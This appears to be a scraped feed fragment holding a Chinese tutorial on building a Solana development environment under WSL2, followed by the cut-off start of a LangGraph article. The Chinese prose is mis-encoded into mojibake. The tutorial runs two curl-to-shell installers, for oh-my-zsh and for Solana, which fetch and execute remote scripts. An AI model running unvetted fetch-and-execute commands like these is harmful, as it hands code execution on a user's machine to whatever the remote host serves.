a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.ç½‘ç»œé…ç½®</h2>
<p>å¼€å¯ Tun æ¨¡å¼ å¹¶ä¿è¯èŠ‚ç‚¹å¯è®¿é—®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ff37433b841435b9499dc9ec8fc3824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1NDUwOQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769622073&amp;x-signature=gP9YV5lwinWhn5mMforX3PMSYrI%3D" alt="" loading="lazy"/></p>
<p>æµ‹è¯•èŠ‚ç‚¹å¯è®¿é—®Solanaï¼Œwinç³»ç»Ÿæµè§ˆå™¨è®¿é—®</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2b10577d376407baa73378fb8c74ef1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1NDUwOQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769622073&amp;x-signature=2Em%2BHf3mFWGr0DYZBex2PcI2Wks%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">2.WSL2ç¯å¢ƒ</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å®‰è£… WSL2  !!! win ç¯å¢ƒcmdä½¿ç”¨</span>
wsl <span class="hljs-attr">--install</span>

# å®‰è£…å‰å…ˆ ping ä¸€ä¸‹ Solana ç¡®ä¿ç½‘ç»œå¯è¾¾ ç½‘å€é€‰æ‹©éœ€è¦æ¢¯å­çš„å°±è¡Œï¼Œè¿™ä¸ªæ–¹ä¾¿å°±è¿™ä¸ª
ping solana<span class="hljs-selector-class">.com</span>

<span class="hljs-comment">// WSL é»˜è®¤å®‰è£… Ubuntuã€‚ä½ å¯ä»¥åœ¨æœç´¢æ ä¸­è¾“å…¥ "Ubuntu" æ¥æ‰“å¼€ Linux ç»ˆç«¯</span>
<span class="hljs-comment">// æ›´æ–°åŒ…åˆ—è¡¨å’Œå‡çº§ç³»ç»Ÿ wslä¸­ä½¿ç”¨</span>
sudo apt update &amp;&amp; sudo apt upgrade -y

<span class="hljs-comment">// å®‰è£… oh-my-zsh ç¾åŒ–ç»ˆç«¯ wslä¸­ä½¿ç”¨</span>
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

<span class="hljs-comment">// å®‰è£… git wslä¸­ä½¿ç”¨</span>
sudo apt install git-<span class="hljs-attribute">all</span>

<span class="hljs-comment">// é‡å¯ WSL2  !!! win ç¯å¢ƒcmdä½¿ç”¨</span>
wsl <span class="hljs-attr">--shutdown</span>
</code></pre>
<p>åœ¨winç³»ç»Ÿåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ è®°å¾—ä½¿ç”¨ vscode åˆ›å»º</p>
<p>ç”±äºå¸¸éœ€è¦å…³é—­ wsl2 ä¸æ¶ˆè€— win æ€§èƒ½ è¿™é‡Œåˆ›å»ºä¸ª WSL_Close.bat è„šæœ¬</p>
<p>åŒå‡»è¿è¡Œå³å¯å…³é—­ wsl2</p>
<pre><code class="hljs language-bash" lang="bash">@<span class="hljs-built_in">echo</span> off
chcp 65001 &gt;nul 2&gt;&amp;1
<span class="hljs-built_in">echo</span> æ­£åœ¨å…³é—­WSL...
wsl --shutdown
<span class="hljs-built_in">echo</span> WSLå·²å…³é—­ï¼Œæ­£åœ¨éªŒè¯...
wsl --list --verbose
<span class="hljs-built_in">echo</span> è‹¥ä¸Šæ–¹åˆ—è¡¨ä¸­WSLçŠ¶æ€ä¸ºStoppedï¼Œåˆ™å…³é—­æˆåŠŸï¼
pause
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d00e2841e30d4773a849d429e65eebfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1NDUwOQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769622073&amp;x-signature=%2FEAaeRj%2BCiGzYkjHBAaQdIfqfCY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">3.Solana ç¯å¢ƒ</h2>
<ol>
<li>å·¥ç¨‹ç›®å½•åˆ’åˆ†</li>
</ol>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‰æ­¥æ‰§è¡Œ</span>
<span class="hljs-comment"># åˆ›å»ºä¼ä¸šçº§å¼€å‘ç›®å½•ç»“æ„</span>
<span class="hljs-built_in">mkdir</span> -p ~/Developer
<span class="hljs-built_in">cd</span> ~/Developer

<span class="hljs-comment"># ä¸»é¡¹ç›®ç»“æ„</span>
<span class="hljs-built_in">mkdir</span> -p \
  projects/solana/{contracts,clients,tests,scripts} \
  projects/rust/{libraries,binary-projects} \
  projects/typescript/{packages,apps} \
  projects/python/{packages,scripts} \
  labs/experiments \
  labs/playground \
  tools/{bin,scripts,configs} \
  docs/{architecture,api-references,meetings} \
  temp/{builds,downloads,cache}

<span class="hljs-comment"># åˆ›å»ºé¡¹ç›®æ ‡è®°æ–‡ä»¶</span>
<span class="hljs-built_in">touch</span> projects/README.md
<span class="hljs-built_in">echo</span> <span class="hljs-string">"# å¼€å‘é¡¹ç›®ç›®å½•"</span> &gt; projects/README.md
</code></pre>
<p>2.  Shellç¯å¢ƒé…ç½® (~/.zshrc)  è¿½åŠ è¿›æ–‡ä»¶ ä¸è¦åŠ¨ä¹‹å‰çš„é…ç½®</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment"># ==================== ä¼ä¸šçº§å¼€å‘ç¯å¢ƒé…ç½® ====================</span>

<span class="hljs-comment"># ç›®å½•åˆ«å</span>
<span class="hljs-built_in">export</span> DEV_ROOT=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/Developer"</span>
<span class="hljs-built_in">export</span> SOLANA_DEV=<span class="hljs-string">"<span class="hljs-variable">$DEV_ROOT</span>/projects/solana"</span>
<span class="hljs-built_in">export</span> RUST_DEV=<span class="hljs-string">"<span class="hljs-variable">$DEV_ROOT</span>/projects/rust"</span>
<span class="hljs-built_in">export</span> TS_DEV=<span class="hljs-string">"<span class="hljs-variable">$DEV_ROOT</span>/projects/typescript"</span>

<span class="hljs-comment"># å¿«é€Ÿè·³è½¬åˆ«å</span>
<span class="hljs-built_in">alias</span> dev=<span class="hljs-string">'cd $DEV_ROOT'</span>
<span class="hljs-built_in">alias</span> sol=<span class="hljs-string">'cd $SOLANA_DEV'</span>
<span class="hljs-built_in">alias</span> rdev=<span class="hljs-string">'cd $RUST_DEV'</span>
<span class="hljs-built_in">alias</span> tsdev=<span class="hljs-string">'cd $TS_DEV'</span>
<span class="hljs-built_in">alias</span> labs=<span class="hljs-string">'cd $DEV_ROOT/labs'</span>
<span class="hljs-built_in">alias</span> tools=<span class="hljs-string">'cd $DEV_ROOT/tools'</span>

<span class="hljs-comment"># é¡¹ç›®ç›®å½•å¿«é€Ÿè·³è½¬</span>
<span class="hljs-function"><span class="hljs-title">prj</span></span>() {
    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">cd</span> <span class="hljs-variable">$DEV_ROOT</span>/projects
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">cd</span> <span class="hljs-variable">$DEV_ROOT</span>/projects/<span class="hljs-variable">$1</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># è·¯å¾„é…ç½®</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$DEV_ROOT</span>/tools/bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.local/bin:<span class="hljs-variable">$PATH</span>"</span>

<span class="hljs-comment"># å¼€å‘å·¥å…·é…ç½®</span>
<span class="hljs-built_in">export</span> RUSTUP_HOME=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.rustup"</span>
<span class="hljs-built_in">export</span> CARGO_HOME=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.cargo"</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$CARGO_HOME</span>/bin:<span class="hljs-variable">$PATH</span>"</span>

<span class="hljs-comment"># Solanaé…ç½®</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.local/share/solana/install/active_release/bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">export</span> SOLANA_METRICS_CONFIG=<span class="hljs-string">"host=https://metrics.solana.com:8086,db=mainnet-beta,u=mainnet-beta_write,p=password"</span>

<span class="hljs-comment"># Node.jsé…ç½®ï¼ˆç”¨äºTypeScript/JavaScriptå¼€å‘ï¼‰</span>
<span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm"</span>
[ -s <span class="hljs-string">"<span class="hljs-variable">$NVM_DIR</span>/nvm.sh"</span> ] &amp;&amp; . <span class="hljs-string">"<span class="hljs-variable">$NVM_DIR</span>/nvm.sh"</span>

<span class="hljs-comment"># Pythoné…ç½®</span>
<span class="hljs-comment"># export PYENV_ROOT="$HOME/.pyenv"</span>
<span class="hljs-comment"># export PATH="$PYENV_ROOT/bin:$PATH"</span>
<span class="hljs-comment"># if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then</span>
<span class="hljs-comment">#     eval "$(pyenv init --path)"</span>
<span class="hljs-comment">#     eval "$(pyenv init -)"</span>
<span class="hljs-comment"># fi</span>

<span class="hljs-comment"># Dockeré…ç½®ï¼ˆå¦‚æœéœ€è¦ï¼‰</span>
<span class="hljs-comment"># export DOCKER_HOST=tcp://localhost:2375</span>

<span class="hljs-comment"># å¼€å‘ç¯å¢ƒå˜é‡</span>
<span class="hljs-comment"># export EDITOR="code"</span>
<span class="hljs-comment"># export VISUAL="$EDITOR"</span>

<span class="hljs-comment"># Gité…ç½®</span>
<span class="hljs-built_in">export</span> GIT_AUTHOR_NAME=<span class="hljs-string">"å¡«å†™ä½ è‡ªå·±çš„"</span>
<span class="hljs-built_in">export</span> GIT_AUTHOR_EMAIL=<span class="hljs-string">"å¡«å†™ä½ è‡ªå·±çš„"</span>
<span class="hljs-built_in">export</span> GIT_COMMITTER_NAME=<span class="hljs-string">"<span class="hljs-variable">$GIT_AUTHOR_NAME</span>"</span>
<span class="hljs-built_in">export</span> GIT_COMMITTER_EMAIL=<span class="hljs-string">"<span class="hljs-variable">$GIT_AUTHOR_EMAIL</span>"</span>

<span class="hljs-comment"># å†å²è®°å½•é…ç½®</span>
<span class="hljs-built_in">export</span> HISTSIZE=10000
<span class="hljs-built_in">export</span> SAVEHIST=10000
<span class="hljs-built_in">export</span> HISTFILE=~/.zsh_history
<span class="hljs-built_in">setopt</span> HIST_IGNORE_ALL_DUPS
<span class="hljs-built_in">setopt</span> HIST_FIND_NO_DUPS
<span class="hljs-built_in">setopt</span> HIST_REDUCE_BLANKS

<span class="hljs-comment"># ==================== å·¥å…·å‡½æ•° ====================</span>

<span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>
dev-<span class="hljs-function"><span class="hljs-title">clean</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ§¹ æ¸…ç†å¼€å‘ç¯å¢ƒ..."</span>
    <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$DEV_ROOT</span>/temp/builds/*
    <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$DEV_ROOT</span>/temp/downloads/*
    cargo clean 2&gt;/dev/null || <span class="hljs-literal">true</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… æ¸…ç†å®Œæˆ"</span>
}

<span class="hljs-comment"># æŸ¥çœ‹ç¯å¢ƒçŠ¶æ€</span>
dev-<span class="hljs-function"><span class="hljs-title">status</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ“Š å¼€å‘ç¯å¢ƒçŠ¶æ€"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"===================="</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Solana: <span class="hljs-subst">$(which solana 2&gt;/dev/null &amp;&amp; solana --version || echo 'æœªå®‰è£…')</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Rust: <span class="hljs-subst">$(which rustc 2&gt;/dev/null &amp;&amp; rustc --version || echo 'æœªå®‰è£…')</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Node: <span class="hljs-subst">$(which node 2&gt;/dev/null &amp;&amp; node --version || echo 'æœªå®‰è£…')</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Python: <span class="hljs-subst">$(which python3 2&gt;/dev/null &amp;&amp; python3 --version || echo 'æœªå®‰è£…')</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"===================="</span>
}

<span class="hljs-comment"># Gitå¿«æ·æ“ä½œ</span>
git-<span class="hljs-function"><span class="hljs-title">ac</span></span>() {
    git add .
    git commit -m <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
}

git-<span class="hljs-function"><span class="hljs-title">acp</span></span>() {
    git add .
    git commit -m <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
    git push
}[ -s <span class="hljs-string">"<span class="hljs-variable">$NVM_DIR</span>/bash_completion"</span> ] &amp;&amp; . <span class="hljs-string">"<span class="hljs-variable">$NVM_DIR</span>/bash_completion"</span>  <span class="hljs-comment"># This loads nvm bash_completion</span>

<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.local/share/solana/install/active_release/bin:<span class="hljs-variable">$PATH</span>"</span>
</code></pre>
<p>è®°å¾—é‡å¯ä¸€ä¸‹ wsl</p>
<ol start="3">
<li>å®‰è£…å‰ææ¡ä»¶</li>
</ol>
<p>å®‰è£…å‰å…ˆ ping ä¸€ä¸‹ Solana</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># å®‰è£…å‰å…ˆ ping ä¸€ä¸‹ Solana ç¡®ä¿ç½‘ç»œå¯è¾¾</span>
ping solana.com

<span class="hljs-meta"># ç½‘ç»œå¯è¾¾åå®‰è£…å‰ææ¡ä»¶ </span>
sudo apt-<span class="hljs-keyword">get</span> install -y \
    build-essential \
    pkg-config \
    libudev-dev llvm libclang-dev \
    protobuf-compiler libssl-dev

<span class="hljs-meta"># å®‰è£… Solana  å¿…éœ€çš„ä¾èµ–é¡¹  è¿™ä¸ªå‘½ä»¤å¯ä»¥å¤šæ¬¡æ‰§è¡Œä¸ä¼šå®‰è£…å†²çªçš„ é‡è§å…¶ä»–æ²¡å®‰è£…ä¸Šåœ¨æ‰§è¡Œä¸€é</span>
curl --proto <span class="hljs-string">'=https'</span> --tlsv1<span class="hljs-number">.2</span> -sSfL https:<span class="hljs-comment">//solana-install.solana.workers.dev | bash</span>
 
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># å®‰è£…æˆåŠŸåï¼Œä¼šè¿”å›ç±»ä¼¼å¦‚ä¸‹çš„è¾“å‡º  </span>
<span class="hljs-attr">Installed Versions:</span>
<span class="hljs-attr">Rust:</span> <span class="hljs-string">rustc</span> <span class="hljs-number">1.92</span><span class="hljs-number">.0</span> <span class="hljs-string">(ded5c06cf</span> <span class="hljs-number">2025-12-08</span><span class="hljs-string">)</span>
<span class="hljs-attr">Solana CLI:</span> <span class="hljs-string">solana-cli</span> <span class="hljs-number">3.0</span><span class="hljs-number">.13</span> <span class="hljs-string">(src:90098d26;</span> <span class="hljs-string">feat:3604001754,</span> <span class="hljs-string">client:Agave)</span>
<span class="hljs-attr">Anchor CLI:</span> <span class="hljs-string">anchor-cli</span> <span class="hljs-number">0.32</span><span class="hljs-number">.1</span>
<span class="hljs-attr">Surfpool CLI:</span> <span class="hljs-string">surfpool</span> <span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-string">-rc1</span>
<span class="hljs-attr">Node.js:</span> <span class="hljs-string">v24.10.0</span>
<span class="hljs-attr">Yarn:</span> <span class="hljs-number">1.22</span><span class="hljs-number">.22</span>
</code></pre>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‡å¯ wsl</span>
<span class="hljs-comment"># ä½¿ç”¨ä¹‹å‰çš„è„šæœ¬éªŒè¯å®‰è£…æƒ…å†µ</span>
dev-status

<span class="hljs-comment"># æˆåŠŸåï¼Œä¼šè¿”å›ç±»ä¼¼å¦‚ä¸‹çš„è¾“å‡º  </span>
ğŸ“Š å¼€å‘ç¯å¢ƒçŠ¶æ€
====================
Solana: /home/liu4509/.local/share/solana/install/active_release/bin/solana
solana-cli 3.0.13 (src:90098d26; feat:3604001754, client:Agave)
Rust: /home/liu4509/.cargo/bin/rustc
rustc 1.92.0 (ded5c06cf 2025-12-08)
Node: /home/liu4509/.nvm/versions/node/v24.10.0/bin/node
v24.10.0
Python: /usr/bin/python3
Python 3.12.3
====================
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangGraph ç³»åˆ— Â· ç¬¬ 1 è®²ï¼šä» 0 æ­å»ºä½ çš„ç¬¬ä¸€ä¸ªæ™ºèƒ½ä½“]]></title>    <link>https://juejin.cn/post/7597278451030343690</link>    <guid>https://juejin.cn/post/7597278451030343690</guid>    <pubDate>2026-01-21T01:08:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451030343690" data-draft-id="7595351120668295194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangGraph ç³»åˆ— Â· ç¬¬ 1 è®²ï¼šä» 0 æ­å»ºä½ çš„ç¬¬ä¸€ä¸ªæ™ºèƒ½ä½“"/> <meta itemprop="keywords" content="LangChain,äººå·¥æ™ºèƒ½,Agent"/> <meta itemprop="datePublished" content="2026-01-21T01:08:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜Ÿæµ©AI"/> <meta itemprop="url" content="https://juejin.cn/user/2904236059009760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangGraph ç³»åˆ— Â· ç¬¬ 1 è®²ï¼šä» 0 æ­å»ºä½ çš„ç¬¬ä¸€ä¸ªæ™ºèƒ½ä½“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2904236059009760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜Ÿæµ©AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T01:08:18.000Z" title="Wed Jan 21 2026 01:08:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. LangGraph ä»‹ç»</h2>
<blockquote>
<p>æœ¬æ–‡æ˜¯ LangGraph ç³»åˆ—çš„ç¬¬ 1 è®²ï¼Œç›®æ ‡æ˜¯å¸¦ä½ ä» 0 æ­å»ºä¸€ä¸ªèƒ½åšå››åˆ™è¿ç®—çš„æœ‰çŠ¶æ€æ™ºèƒ½ä½“ï¼Œç†è§£å›¾ã€èŠ‚ç‚¹ã€è¾¹å’ŒçŠ¶æ€è¿™å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œä¸ºåç»­ Memoryã€RAGã€å¤šä»£ç†ç­‰é«˜çº§ç”¨æ³•æ‰“ä¸‹åŸºç¡€ã€‚</p>
</blockquote>
<h3 data-id="heading-1">1.1 åŸºæœ¬æ¦‚è¿°</h3>
<p>LangGraph æ˜¯ç”± LangChain å›¢é˜Ÿå¼€å‘çš„åº•å±‚ç¼–æ’æ¡†æ¶å’Œè¿è¡Œæ—¶ï¼Œæ—¨åœ¨å¸®åŠ©å¼€å‘è€…æ„å»ºåŸºäºå¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„å¤æ‚ã€æœ‰çŠ¶æ€ã€å¤šä¸»ä½“åº”ç”¨ã€‚å®ƒå°†å·¥ä½œæµè¡¨ç¤ºä¸ºæœ‰å‘å›¾ï¼ˆgraphï¼‰ï¼Œæä¾›æ›´é«˜çš„çµæ´»æ€§å’Œæ§åˆ¶èƒ½åŠ›ï¼Œç‰¹åˆ«é€‚åˆå¾ªç¯é€»è¾‘ã€çŠ¶æ€ç®¡ç†ä»¥åŠå¤šä¸»ä½“åä½œçš„åœºæ™¯ï¼ˆå¦‚æ™ºèƒ½ä»£ç†ã€å¤šä»£ç†å·¥ä½œæµï¼‰ã€‚</p>
<p>é€‚åˆè¯»è€…ï¼šå·²å…·å¤‡åŸºç¡€<strong>Python / LangChain</strong>çŸ¥è¯†ï¼Œæƒ³è¦å®ç°â€œæœ‰çŠ¶æ€ã€å¯å¾ªç¯ã€å¯è°ƒè¯•â€å·¥ä½œæµçš„å¼€å‘è€…ã€‚</p>
<p>æœ¬è®²ä½ å°†å­¦ä¼šï¼š</p>
<ul>
